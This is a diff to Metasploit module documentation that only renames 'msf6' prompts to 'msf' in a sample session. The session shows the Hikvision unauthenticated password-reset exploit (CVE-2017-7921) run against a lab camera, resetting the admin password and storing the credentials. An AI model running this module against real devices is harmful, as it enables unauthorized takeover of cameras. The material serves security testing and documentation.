@@ -59,18 +59,18 @@ This option allows you to store the user and password credentials in the Metaspl
 ### Hikvision DS-2CD2142FWD-IS Firmware Version V5.4.1 build 160525
 
 ```
-msf6 > use auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set RHOSTS 192.168.100.180
+msf > use auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set RHOSTS 192.168.100.180
 RHOSTS => 192.168.100.180
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set USERNAME admin
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set USERNAME admin
 USERNAME => admin
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set PASSWORD Pa$$W0rd
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set PASSWORD Pa$$W0rd
 PASSWORD => Pa$$W0rd
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set ID 1
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set ID 1
 ID => 1
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set STORE_CRED true
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set STORE_CRED true
 STORE_CRED => true
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > options
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > options
 
 Module options (auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921):
 
@@ -87,13 +87,13 @@ Module options (auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921):
    USERNAME    admin            yes       Username for password change
    VHOST                        no        HTTP server virtual host
 
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > check
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > check
 
 [*] Following users are available for password reset...
 [*] USERNAME:admin | ID:1 | ROLE:Administrator
 [*] USERNAME:admln | ID:2 | ROLE:Operator
 [+] 192.168.100.180:80 - The target is vulnerable.
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > run
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > run
 [*] Running module against 192.168.100.180
 
 [*] Following users are available for password reset...
@@ -104,7 +104,7 @@ msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > run
 [*] Please log in with your new password: Pa$$W0rd
 [*] Credentials for admin were added to the database...
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset) > creds -O 192.168.100.180
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset) > creds -O 192.168.100.180
 Credentials
 ===========
 
@@ -112,5 +112,5 @@ host             origin           service        public  private   realm  privat
 ----             ------           -------        ------  -------   -----  ------------  ----------
 192.168.100.180  192.168.100.180  80/tcp (http)  admin   Pa$$W0rd         Password
 
-msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) 
+msf auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) 
 ```
